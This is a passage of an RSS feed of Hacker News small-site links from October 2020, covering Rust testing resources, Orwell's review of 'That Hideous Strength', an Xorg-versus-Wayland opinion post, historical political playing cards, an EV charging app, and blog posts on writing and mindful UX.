<a href="http://erickt.github.io/blog/2015/09/22/if-you-use-unsafe/">If you use unsafe ‚Ä¶</a></li>
    </ul>
  </li>
  <li><a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>
(not so much about testing here ‚Äì but useful)</li>
</ul>

<h3 id="mutation-testing">Mutation testing</h3>

<ul>
  <li><a href="https://github.com/llogiq/mutagen">Mutagen</a> ‚Äì
mutation testing tool implemented using procedural macros</li>
</ul>

<h3 id="test-generation">Test generation</h3>

<ul>
  <li><a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">Writing a testcase generator for a programming language</a>
Generate random wasm with ‚Äúwasm-smith‚Äù in Rust</li>
</ul>

<h3 id="mocking-libraries">Mocking libraries</h3>

<p>There are <em>a lot</em> of mocking / faking libraries ‚Äì this is a limited
list of what I found.</p>

<ul>
  <li><a href="https://asomers.github.io/mock_shootout/">Rust mock shootout</a>:
a fairly thorough survey of Rust mocking libraries.
This lead to the development of
<a href="https://github.com/asomers/mockall">mockall</a>
that is one of (the?) most popular mocking library.</li>
  <li><a href="https://github.com/asomers/mockall">mockall</a> mocking library</li>
  <li><a href="https://github.com/CodeSandwich/Mocktopus">mocktopus</a></li>
  <li><a href="https://docs.rs/httpmock/0.5.0/httpmock/">Httpmock</a></li>
  <li><a href="https://lib.rs/crates/partial-io">Partial-io</a>
wraps Read/Write implementations, optional Future and quickcheck support</li>
</ul>

<h3 id="error-handling">Error handling</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/errors.html">CLI applications in Rust</a>,
<a href="https://nick.groenen.me/posts/rust-error-handling/">Structuring and using errors in 2020</a></p>

<p>Not quite about testing ‚Äì but semi-relevant.</p>

<ul>
  <li>Use of ?</li>
  <li><a href="https://docs.rs/anyhow/1.0.33/anyhow/">Anyhow</a> ‚Äì adding context to error messages</li>
  <li><a href="https://blog.yoshuawuyts.com/error-handling-survey/">Error handling survey</a></li>
</ul>

<h3 id="misc">Misc</h3>

<ul>
  <li>kruetz on reddit
<a href="https://www.reddit.com/r/rust/comments/jl2xlg/rust_designfortestability_a_survey/ganb86b?utm_source=share&amp;utm_medium=web2x&amp;context=3">described how he checks that code in mdbooks compiles correctly</a></li>
</ul>

<h2 id="more-information">More information</h2>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alastairreid.github.io/rust-testability/">https://alastairreid.github.io/rust-testability/</a></em></p>]]>
            </description>
            <link>https://alastairreid.github.io/rust-testability/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945657</guid>
            <pubDate>Fri, 30 Oct 2020 19:00:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Scientists Take Over: George Orwell Reviews ‚ÄúThat Hideous Strength‚Äù (1945)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945608">thread link</a>) | @benbreen
<br/>
October 30, 2020 | http://lewisiana.nl/orwell/index.htm | <a href="https://web.archive.org/web/*/http://lewisiana.nl/orwell/index.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>







<p><b><span lang="EN-US">George
Orwell‚Äôs review of C. S. Lewis, <i>That
Hideous Strength</i> (1945)<o:p></o:p></span></b></p>



<p><span lang="EN-US">THE SCIENTISTS TAKE OVER<o:p></o:p></span></p>

<p><b><i><span lang="EN-US">Manchester Evening News</span></i></b><b><span lang="EN-US">, 16 August 1945. </span></b><span lang="EN-US">Reprinted in <i>The Complete Works of George Orwell</i>, ed. Peter Davison,
Vol. XVII (1998), No. 2720 (first half), pp. 250‚Äì251<o:p></o:p></span></p>











<p><span lang="EN-GB">On</span><span lang="EN-US"> the whole, novels are better when there are no
miracles in them. Still, it is possible to think of a fairly large number of worth-while
books in which ghosts, magic, second-sight, angels, mermaids, and what-not play
a part.<o:p></o:p></span></p>

<p><span lang="EN-US">Mr. C. S. Lewis‚Äôs ‚ÄúThat Hideous Strength‚Äù can be included in their number ‚Äì
though, curiously enough, it would probably have been a better book if the
magical element had been left out. For in essence it is a crime story, and the
miraculous happenings, though they grow more frequent towards the end, are not
integral to it.<o:p></o:p></span></p>

<p><span lang="EN-US">In general outline, and to some extent in atmosphere, it rather resembles
G. K. Chesterton‚Äôs ‚ÄúThe Man Who Was Thursday.‚Äù<o:p></o:p></span></p>

<p><span lang="EN-US">Mr. Lewis probably owes something to Chesterton as a writer, and certainly
shares his horror of modern machine <span>civilisation</span> (the
title of the book, by the way, is taken from a poem about the Tower of Babel)
and his reliance on the ‚Äúeternal verities‚Äù of the Christian Church, as against
scientific materialism or nihilism.<o:p></o:p></span></p>

<p><span lang="EN-US">His book describes the struggle of a little group of sane people against a
nightmare that nearly conquers the world. A company of mad scientists ‚Äì or,
perhaps, they are not mad, but have merely destroyed in themselves all human
feeling, all notion of good and evil ‚Äì are plotting to conquer Britain, then
the whole planet, and then other planets, until they have brought the universe
under their control.<o:p></o:p></span></p>

<p><span lang="EN-US">All superfluous life is to be wiped out, all natural forces tamed, the
common people are to be used as slaves and vivisection subjects by the ruling
caste of scientists, who even see their way to conferring immortal life upon
themselves. Man, in short, is to storm the heavens and overthrow the gods, or
even to become a god himself.<o:p></o:p></span></p>

<p><span lang="EN-US">There is nothing outrageously improbable in such a conspiracy. Indeed, at a
moment when a single atomic bomb ‚Äì of a type already pronounced ‚Äúobsolete‚Äù ‚Äì
has just blown probably three hundred thousand people to fragments, it sounds
all too topical. Plenty of people in our age do entertain the monstrous dreams
of power that Mr. Lewis attributes to his characters, and we are within sight
of the time when such dreams will be <span>realisable</span>.<o:p></o:p></span></p>

<p><span lang="EN-US">His description of the N.I.C.E. (National Institute of Co-ordinated
Experiments), with its world-wide ramifications, its private army, its secret
torture chambers, and its inner ring of adepts ruled over by a mysterious
personage known as The Head, is as exciting as any detective story.<o:p></o:p></span></p>

<p><span lang="EN-US">It would be a very hardened reader who would not experience a thrill on
learning that The Head is actually ‚Äì however, that would be giving the game
away.<o:p></o:p></span></p>

<p><span lang="EN-US">One could recommend this book unreservedly if Mr. Lewis had succeeded in keeping
it all on a single level. Unfortunately, the supernatural keeps breaking in,
and it does so in rather confusing, undisciplined ways. The scientists are <span>endeavouring</span>, among other things, to get hold of the body
of the ancient Celtic magician Merlin, who has been buried ‚Äì not dead, but in a
trance ‚Äì for the last 1,500 years, in hopes of learning from him the secrets of
pre-Christian magic.<o:p></o:p></span></p>

<p><span lang="EN-US">They are frustrated by a character who is only doubtfully a human being,
having spent part of his time on another planet where he has been gifted with
eternal youth. Then there is a woman with second sight, one or two ghosts, and
various superhuman visitors from outer space, some of them with rather tiresome
names which derive from earlier books of Mr. Lewis‚Äôs. The book ends in a way
that is so preposterous that it does not even succeed in being horrible in
spite of much bloodshed.<o:p></o:p></span></p>

<p><span lang="EN-US">Much is made of the fact that the scientists are actually in touch with
evil spirits, although this fact is known only to the inmost circle. Mr. Lewis
appears to believe in the existence of such spirits, and of benevolent ones as
well. He is entitled to his beliefs, but they weaken his story, not only
because they offend the average reader‚Äôs sense of probability but because in
effect they decide the issue in advance. When one is told that God and the
Devil are in conflict one always knows which side is going to win. The whole
drama of the struggle against evil lies in the fact that one does not have
supernatural aid. However, by the standard of the novels appearing nowadays
this is a book worth reading.<o:p></o:p></span></p>







</div></div>]]>
            </description>
            <link>http://lewisiana.nl/orwell/index.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945608</guid>
            <pubDate>Fri, 30 Oct 2020 18:55:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Neighbourly Solution to the 'X Is Deprecated? ' Conundrum]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 26 (<a href="https://news.ycombinator.com/item?id=24945538">thread link</a>) | @zdw
<br/>
October 30, 2020 | https://www.divergent-desktop.org/blog/2020/10/29/improving-x/ | <a href="https://web.archive.org/web/*/https://www.divergent-desktop.org/blog/2020/10/29/improving-x/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <div>
        <article lang="en">
          
          <p>Recent posts about the state of Xorg and its future has been stirring the
internets as of late and, as almost always, it is best to stay clear of the
comments sections. The more insightful post is <a href="https://ajaxnwnk.blogspot.com/2020/10/on-abandoning-x-server.html">On Abandoning the X Server</a>.</p>

<p>There are a few details in it that should be emphasised before we move on.</p>

<div><div><pre><blockquote>Though the code happens to implement an unfortunate
specification, the code itself is quite well structured, easy to hack on, and
not far off from being easily embeddable.</blockquote></pre></div></div>

<p>From my own experiences with Xorg internals, I agree completely. A whole lot
of the code there is noticably better than corresponding paths in certain
Wayland compositors. There is more thought; domain expertise; engineering and
pure elbow grease behind it than you might have been led to believe -- if you
have only listened in to the collective moans in various discussion groups.</p>

<div><div><pre><blockquote>So is Xorg abandoned? To the extent that means using it to actually
control the display, and not just keep X apps running, I'd say yes. But xserver
is more than xfree86. Xwayland, Xwin, Xephyr, Xvnc, Xvfb: these are projects
with real value that we should not give up. A better way to say it is that we
can finally abandon xfree86.</blockquote></pre></div></div>

<p>There are some nuances here that many will miss as it requires you to know
something about the architecture of the X server. The main thing is to not
conflate ‚Äòxfree86‚Äô with rest of what you think of as X, hence why the blog post
separates out XFree86-the-project from 'xfree86 the hardware driver'. It is
unfortunate that the predecessor to Xorg was also called XFree86. Naming
things is hard and all that.</p>

<p>If you look at the xorg code, recommended reading for many who can
understand the language, you will see that the device-dependent code used to
drive displays (hw/ in the source tree) has a few backends, mentioned above.
Venture into the hw/xfree86 part and you will hopefully see why Adam Jackson
and others deserve the software engineering equivalent of a Purple Heart for
their service to your desktop, possibly alongside anyone that ever had to work
on ASN.1.</p>

<p>
<i>Rightfully throw Xorg-xfree86 into the fires of Mt. Doom. If you
still need Xorg-xfree86 to be your graphics card driver, you have bigger things
to worry about, such as plain old bitrot.</i></p>

<p>Is there something else? Yes. I‚Äôm not going to say <a href="https://arcan-fe.com/">Arcan</a> ‚Äì it is <i>very</i> likely that there
is only a small percentage of the stakeholders we would ever get along with.
That is fine. The goals and agenda reach much further than many will ever care
to travel -- unless you really want to push the boundaries of computing, or you
are actively targeted by nefarious individuals; our funding is not based on
popularity or mass adoption, but rather sticking to the shadows.</p>

<h2>The Compromise</h2>
<p>So what can we do instead? The current Wayland maintainer has
<a href="https://github.com/emersion/libliftoff">libliftoff</a> for smoothing
over the rather ‚Äòunergonomic‚Äô APIs that are used to get the open, modern,
graphics stack up and running. <em>Write a DDX backend that uses it.
hw/liftoff!</em></p>

<p>This will get liftoff the lift-off and mileage it needs to become good
enough for Wayland compositors to use as their default, and as a slightly more
polite migration path in order for NVIDIA to be less contemptible in the
unlikely event that they are one day struck by some capitalist version of
religious insight. Thus, it improves parts of the Wayland compositor situation
that is, politely put, chaotic.</p>

<p>Those that don‚Äôt care about what Wayland tries to achieve can stay with X and
not worry about their graphics breaking after a kernel update, or well, more
than usual -- Linux gotta Linux. NVIDIA blob users can continue down that path
and stop bothering Wayland developers, yet still run their Steam games without
submitting to open source ideals.</p>

<p>Next steps. This is for the window managers. Take libarcan-shmif-server and
embed as a module in Xorg, fork it off even. If you are unaware, this is the
IPC system part of Arcan. Both the server and the client sides of it are fairly
trivial to use and are written with developers, not toolkits, in mind.</p>

<p>It is beyond feature parity with the rest of X, but has a comparable view on
capabilities and division of responsibility. You will only get a fraction of
the benefits of Arcan as a display server, but without other dependencies or
friction - many of the problems that X clients are plagued with can be worked
around while leaving the X11 protocol and its family of extensions to rest.
Hacks relying on facilities like uinput can be put down.</p>

<p>The security around these clients will be much tighter and they can be
gradually tuned to the specification of the developer. It lets XFCE, AwesomeWM,
WindowMaker and the tens to hundreds of others WM projects to continue to
improve their respective ecosystems, specialized widgets and other tools,
rather than to burn resources they don't have to rewrite themselves with bugs
that won't be discovered or fixed in time to matter.</p>

<p>It also gives the conservative side of BSDs a portable way of improving
their use of the graphics stack without reworking fundamentals they care little
about. The OpenBSD fork 'Xenocara' can be dropped.</p>

<p>This way, the heritage is preserved and kept alive, with a band aid to live
out another decade or three. It will still work for the marginalized that have
little interest- or option- in going elsewhere. It will be less painful to
maintain and work with.</p>

<h2>The Reality</h2>
<p>Wayland only is not an option that will ever work across the board. It is
not a replacement, it is a fundamental change of principles. Stop trying to
market it as some kind of inevitable transition. There are strong differences
that will not get smoothed over regardless of how many 'protocols' you define;
<i>Wayland is Policy over Mechanism, X11 is Mechanism over Policy</i>. This is
the real barrier. Not unsubstantiated claims of 'security'. It is a tectonic
shift and no matter your feelings about that, we won't all be in the same
country or continent anymore.</p>

<p>Heralding a 'Screenshot Protocol' and similar exercises as the fix that will
bridge this gap will only serve to distract from the fact that the power of all
these little tools and hacks from the crowd of X11 users comes from the
'screenshot' being just one case of <i>'give me the contents of a specific
window and all of its children'</i> or <i>'composite these windows to an
offscreen buffer and send me the results'</i> as the building blocks
available to be creative with.

</p><p>The mechanism approach provides a huge set of possibilities and opens up for
experimentation and 'works for me' kind of hacks. The downside is that it
surrenders control on the server side and are much harder to make robust.</p>

<p>The policy aproach will only do what both sides agree to, and <i>that
	agreement has the final say</i>. If you violate this contract, you are to be
blamed. However, that contract has to be bikeshedded to near state-space
exhaustion and carefully screened for conflicts as more contracts are added to
the pile.</p>

<p>The current trajectory is Gnomelanders and Swaylanders and Kwinners and so
on continuing to lock down singular uses cases and with political gunplay try
to push that as the one solution that will convince a few more bread crumbs.
The hand that controls the toolkit will eventually just decide. <i> This will
erode the strength of the policy contract</i>.</p>

<p>This has already led to a substantial amount of dissonance -- it turns out
that the 'opting-server-side decoration protocol' in the mix had implications
for how to interpret the 'subsurface protocol' and the 'redshift gamma
protocol' will clash with whatever 'color management protocol' that materialize
and so on. To get a feel for how involved such policies become, just <a href="https://github.com/wayland-project/wayland-protocols/blob/3a74660e94d85fde24f504cc9d4375d42192e84a/stable/xdg-shell/xdg-shell.xml#L402">
read the specification</a> and you will see why no implementation arrives at
the same calculation.</p>

<p>Take the perspective of a client developer chasing after the tumbleweed of
'protocols' drifting around and try to answer 'what am I supposed to implement
and use'? To me it looked like like a Picasso painting of ill-fitting- and
internally conflicted ideas. Let this continue a few cycles more and X11 will
look clean and balanced by comparison. Someone should propose a desktop icon
protocol for the sake of it, then again, someone probably already has.</p>

<h2>In Conclusion</h2>
<p>This approach will force Wayland to demonstrate its worth through the
virtues of its properties alone or by inventing actually compelling features
rather than by throwing shade on the elderly; or reimplementing the past
through rebranded and traced outlines from shadows cast by grander window
managers of yore.</p>

<p>The proposal leaves us with three well-defined paths.</p>

<ul>
<li>Wayland lets your own solipsist thiefdoms expand towards the horizon,
while trying to save embedded from the Android expanse.</li>
<li>People that have invested their hearts and souls into the X ecosystem can
continue to use their computers without fear of a kernel upgrade leaving them
with broken graphics, or a switch of display server paradigm leaving them with
an incompatible mental model of how system graphics work, and perhaps, one day,
stop whining about Wayland ruining their day and leave the devs alone.</li>
<li>Arcan lets you play with crazy ideas at a low initial cost. The ones
that might revolutionise your world or fail miserably. It will continue to
pushing things towards whatever is beyond the Twilight Zone in order to answer
profound questions such as 'what happens to productivity if your heartbeat
aligns with the blink rate of the cursor' (well that's actually be done since
forever and the RESULTS WOULD SHOCK YOU! - but it still illustrates the
point).</li>
</ul>

<p>It might even turn out so well that one of these paths will have a
fighting chance against the open desktop being further marginalised as a thin
client in the Azure clouded future; nothing more than a silhouette behind
unwashed Windows, a virtualized ghost of its former self.</p>

        </article>
	     </div>
     </div></div>]]>
            </description>
            <link>https://www.divergent-desktop.org/blog/2020/10/29/improving-x/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945538</guid>
            <pubDate>Fri, 30 Oct 2020 18:45:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Political Playing Cards over the Centuries]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24945531">thread link</a>) | @tapneal
<br/>
October 30, 2020 | https://solitaired.com/political-card-decks-over-the-centuries | <a href="https://web.archive.org/web/*/https://solitaired.com/political-card-decks-over-the-centuries">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Playing cards have been around for much longer than any of us think. Even though the cards we use today are relatively recent, the earliest records of playing cards date back to the Tan dynasty around the 9th century AD. Even though card games were called leaf games back in 868AD when princess Tongchang played with them, the concept remains the same.</p>
<p>Playing card design has been used as a means of political expressions over the centuries, and represent a glimpse into political feelings of the time. We√¢‚Ç¨‚Ñ¢ve compiled some of the most interesting political decks below. </p>
<h3 id="1973politicalplayingcards">1973 Political Playing Cards</h3>
<p>Released by Fournier in 1973, the deck contains humorist drawings of politicians and other kinds of leaders from the 20th century, including religious leaders, despots, dictators, presidents, and more.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/spain.jpg"></p>
<h3 id="antifascistpropaganda">Anti-Fascist Propaganda</h3>
<p>An anti-fascist card deck from 1943, designed and printed by order of Stalin with a goal of making fun of the German empire from that era.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/antifacist.png"></p>
<h3 id="antinapoleon">Anti-Napoleon</h3>
<p>Most likely German-made around 1815, this deck of cards was designed and printed to portray the liberation war between Napoleon and the opposing forces.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/napoleon.png"></p>
<h3 id="backtotheussr">Back to the USSR</h3>
<p>Designed and printed mainly for the Russian market back in 1995, the cards portray the most popular leaders and politicians from USSR history.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/ussr.png"></p>
<h3 id="bicyclecivilwardeck">Bicycle Civil War Deck</h3>
<p>Aimed at showing important historical characters from the American civil war era, these playing cards are relatively new and came into production in 2017. <a href="https://www.wopc.co.uk/usa/uspcc/bicycle-civil-war" rel="√¢‚Ç¨ÔøΩnofollow√¢‚Ç¨ÔøΩ">Check it out.</a></p>
<h3 id="cartesimperialesetroyales">Cartes Imperiales et Royales</h3>
<p>Going back to the mid-19th century, we have cards that show consorts and imperial rulers from England, Austria, France, and Russia.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/royals.png"></p>
<h3 id="churchillinww2">Churchill in WW2</h3>
<p>An entire deck dedicated to Winston Churchill in World War 2 shows him in multiple positions as an officer, politician, writer, and salesman.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/church.png"></p>
<h3 id="dutchroyalfamily1879">Dutch Royal Family 1879</h3>
<p>A deck of cards dedicated to King William III's second marriage to Princess Emma of Waldeck-Pyrmont, where most of the cards consist of Dutch Royalty and soldiers.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/dutch.png"></p>
<h3 id="imperialroyalpack">Imperial Royal Pack</h3>
<p>Published in London in 1828, the Imperial Royal Pack contains portraits of important people from the Spanish, Turkish, French, and English empires.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/imperial.png"></p>
<h3 id="frenchrevolution">French Revolution</h3>
<p>A French Revolution deck printed in 1793 on woodblocks with stencils coloring showing the plain old people of France, including farmers and philosophers.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/french.png"></p>
<h3 id="satireofolivercromwellsgovernmentfrom1679">Satire of Oliver Cromwell√¢‚Ç¨‚Ñ¢s Government from 1679</h3>
<p>Quite older than most here, this desk was engraved and was intended to mock the government of Oliver Cromwell during the Rump Parliament era.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/cromwell.png"></p>
<h3 id="tripoliwar1815">Tripoli War 1815</h3>
<p>A scarce set of cards, printed around 1815 and designed with courts that aimed to commemorate the Tripoli War. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="√¢‚Ç¨ÔøΩnofollow√¢‚Ç¨ÔøΩ">Learn more</a></p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/tripoli.png"></p>
<h3 id="mortimernelsoncivilwarconfederategenerals">Mortimer Nelson Civil War Confederate Generals</h3>
<p>52 card deck designed and printed in 1863 with the goal of painting a picture of the Confederate officers or officials from that era. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="√¢‚Ç¨≈ìnofollow√¢‚Ç¨ÔøΩ">Learn more</a>.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/civilwar.png"></p>
<h3 id="ahcaffeecomicalpoliticalplayingcards1888onpresidentialelection">A.H. Caffee Comical Political Playing Cards 1888 on Presidential Election</h3>
<p>This deck of cards was designed and printed back in 1888 to honor Cleveland and Harrison's contest for president. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="√¢‚Ç¨≈ìnofollow√¢‚Ç¨ÔøΩ">Learn more</a>.</p>
<h3 id="biermansworldwariplayingcards1915">Biermans World War I Playing Cards 1915</h3>
<p>Printed and designed by Biermans in 1915, the cards were supposed to paint a satirical picture of the German military's politicians and army personnel. <a href="https://www.potterauctions.com/pdf/Catalog_048_WEB.pdf" rel="√¢‚Ç¨≈ìnofollow√¢‚Ç¨ÔøΩ">Learn more</a>.
<img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/ww1.png"></p>
<h3 id="ww1commemorative">WW1 Commemorative</h3>
<p>To celebrate the victory in World War 1, Belgium printed these cards to commemorate presidents, kings, and queens as well as generals from their allying countries.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/ww1c.png"></p>
<h3 id="kennedykards">Kennedy Kards</h3>
<p>Humor House released the cards in 1963, showing all Kennedy family members as well as JFK's successor president, LBJ.</p>
<p><img width="900" src="https://defbnszqe1hwm.cloudfront.net/images/kennedy.jpg"></p>
<p>Many of these decks were found on <a href="https://www.wopc.co.uk/" rel="√¢‚Ç¨≈ìnofollow√¢‚Ç¨ÔøΩ">World of Playing Cards</a>, a great resource for historical playing card. </p></div></div></div></div>]]>
            </description>
            <link>https://solitaired.com/political-card-decks-over-the-centuries</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945531</guid>
            <pubDate>Fri, 30 Oct 2020 18:45:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Waze for EV Drivers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945456">thread link</a>) | @mo3elm
<br/>
October 30, 2020 | https://bauenmotors.com/chargeApp | <a href="https://web.archive.org/web/*/https://bauenmotors.com/chargeApp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="services">
        <div>
        <p> Why Charge App?</p>
        <p>Smart. Personal. And its free.</p>
            <center>
            <div>
                    <div>
                        <div>
                            <p><img src="https://bauenmotors.com/imgs/route-chargeApp.png"></p><p>Personalized trip <br>planning</p>
                            
                        </div>
                        <div>
                            <p><img src="https://bauenmotors.com/imgs/locationInfo-chargeApp.png"></p><p>Always up to date station <br> information</p>
                        </div>
                        <div>
                            <p><img src="https://bauenmotors.com/imgs/ai-chargeApp.png"></p><p>AI-based charge <br>recommendation</p>
                        </div>
                    </div>
                </div>
            </center>
        
        </div>
    </section></div>]]>
            </description>
            <link>https://bauenmotors.com/chargeApp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945456</guid>
            <pubDate>Fri, 30 Oct 2020 18:37:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The time to write has come]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945404">thread link</a>) | @lassmaglio
<br/>
October 30, 2020 | https://www.sandromaglione.com/2020/10/30/the-time-to-write-has-come/ | <a href="https://web.archive.org/web/*/https://www.sandromaglione.com/2020/10/30/the-time-to-write-has-come/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Today I am glad to take a step to the next level, writing.</p><p>Like many other individuals, the feel to write has always been alive inside me. I believe this is a common trait for avid readers. I was part of a large tribe for which ‚ÄúI love reading, and I would love writing as well!‚Äù, and then I did not fall throw on my instinct to actually sit and write anything.</p><h2>Where do I come from</h2><p>My journey is not unusual, see if you recognize it. I have never read anything in the first 17 years of my life. What a waste. Then something (no one knows what) clicked and I started reading book after book. Reading became second nature. A day without reading was a waste.</p><p>Then it came to the phase ‚ÄúI want to read X books this year‚Äù. I set my goal to one book per week in 2018. I hit the goal. 54 total. I was proud, I was officially a member of an elit√® group of readers on the planet.</p><p>After that my rhythm plummeted, and for good reasons. I asked myself ‚ÄúWhat does it mean reading 54 books a year when the longest was 1100 pages and the shortest 50? It does not make sense!‚Äù. So I came to the conclusion that reading just for scoring more pages is dumb. Do not fool yourself. In this new phase, reading became more involved and less urgent.</p><h2>How did I come to writing</h2><p>The last phase I entered is the ‚ÄúWhere did I read this concept already?‚Äù. Having many books under my belt (no-fiction especially) meant knowing many ideas by heart. I started recognizing a pattern. Many books tell you the same story. Every book is different, but the ideas at its core are often the same. Especially in the no-fiction world I was accustomed to.</p><p>And so my reading pace slowed down even further. I moved more heavily to fiction books. 500-1000 pages books. Trilogies or more. Counting my books read did not make any sense anymore. Now my joy came from the story. Knowing that sitting down to read meant entering a new world. Many authors are masters in the art of making you experience their fictional world to the fullest. What a great skill. How do they do it? They write.</p><hr><p>And here I am now. I write. Why writing? There are many reasons (a Google search would teach you more on the topic pretty fast). Basically, it all comes down to opening the doors of your own thoughts. Learning how to express them in words. Learning how to be expressive. Learning what goes on in your own mind. And why not, sharing your ideas with people.</p><p>Here I am then. Writer. Like many other things, writing must be a habit to nurture. Having a consistent schedule. Not bothering overthinking about the words you write until the end of the session. But you know, if I can read 54 books in a year, writing consistently is not a problem at all.</p> </div></div></div>]]>
            </description>
            <link>https://www.sandromaglione.com/2020/10/30/the-time-to-write-has-come/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945404</guid>
            <pubDate>Fri, 30 Oct 2020 18:31:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Apply Mindful UX to Your Daily Life]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945364">thread link</a>) | @parsecs
<br/>
October 30, 2020 | https://thistooshallgrow.com/blog/6-ways-mindful-ux-daily-life | <a href="https://web.archive.org/web/*/https://thistooshallgrow.com/blog/6-ways-mindful-ux-daily-life">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-a7abb749998f8defa959"><div><p>Mindful UX protects users' mental health, privacy, and mental state. It's inclusive and accessible. It aims to prevent harm and to help recover from it.</p><h2>Managing the level of interruptions</h2><p>A product has various ways to communicate information. Visual and auditive senses are the most commonly used. Digital items sometimes use touch, for instance with haptic feedback. Some notifications require your attention immediately, for instance if your cooking timer goes off and you don't want to burn your shakshuka. Some are neither urgent nor important. Yes, airline company newsletter, I'm looking at you, especially at the moment. Finally, some don't have any fixed level of urgency or importance: you will adapt them to your contextual needs. My phone is always in silent mode, but I'll activate the ringtone if I'm expecting an important call.</p><p>We can admire Slack's fantastic workflow for notifications. (<a href="https://slack.engineering/reducing-slacks-memory-footprint/" target="_blank">Source</a>)</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604080575308_6648"><div><p>In real life, how do you decide on the way you're communicating news with someone? It can depend on:</p><ul data-rte-list="default"><li><p>Your interlocutor (professional relation, family, long lost friend)</p></li><li><p>The number of interlocutors</p></li><li><p>The nature of the news (sensitive or not)</p></li><li><p>The urgency</p></li><li><p>The importance: paying your taxes might not be urgent if the deadline is 2 months from now, but it is important as you certainly don't want to miss it</p></li></ul><p>Based on all of that, are you going to call, email, text, video call, send a Twitter DM, leave a post-it note? Are you going to send reminders?</p><h2>Limiting distractions, protecting your attention</h2><p>We all know about this, you don't need me to spell it out: everyone is competing for our attention. You might have already taken measures to limit distractions: your phone might be in silent mode, you might even disable some notifications, block ads, disable autoplay, etc. Android and iOS even carry <a href="https://www.theverge.com/2018/6/5/17426922/apple-digital-health-vs-google-wellbeing-time-well-spent-wwdc-2018" target="_blank">native features to help us protect our attention</a>.</p><p>Apart from the digital measures I've just mentioned, there's another way you can mitigate distractions. If you share your physical work space with others - like I am doing in our current lockdown - you can signal when you're available to be interrupted and when you're not. Leave a sign on your door, place an object on your desk, etc.</p><p>There are even different levels for that:</p><ul data-rte-list="default"><li><p>Available</p></li><li><p>Only disturb if urgent</p></li><li><p>Do not disturb under any circumstances</p></li></ul><h2>Paying attention to accessibility</h2><p>An accessible product is a product that's usable by everyone. The quintessence of inaccessible design are Terms &amp; Conditions. Never-ending walls of text with little to no page layout, all written in legalese. For those of you who don't know, "legalese" represents legal lingo that's completely closed off to the uninitiated.</p><p>An easy way to be more mindful of accessibility in your daily life, is to adapt your communication. If you want to use jargon with people who might not be familiar with it, explain what it means - just like I did above with "legalese". In a group discussion, give background and context so that everyone has the same level of information and everyone can follow. When writing up a document, highlight the key information to make it easily scannable.</p><h2>Removing visual clutter</h2><p>We are well aware that visual overstimulation is detrimental for us. I even asked people on Twitter about it, and the results are telling.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604080575308_11640"><div><p>Whether it's in your room or at your desk, trimming down the visual clutter allows by contrast to shine more light on what's important, on the few things that you decide to leave in sight. Not only does that make it easier for you to find something you're looking for, but it's also nicer and less stressful on the eyes, because you have less visual stimuli.</p><p>The same applies to your digital places. Leaving white space and room to breathe is beneficial and so much more relaxing. Here's what my phone and laptop screens look like: much better than having files and apps filling up the space.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604080575308_30876"><div><h2>Avoiding cognitive overload</h2><p>Cognitive load refers to the mental effort we have to make to use a product, achieve a task, etc. We've all known someone who had the bad habit of starting Matryoshka sentences - or Russian dolls sentences if you prefer. "<em>I had a call with Tamara, because we have a group chat with Marie, and by the way did you know 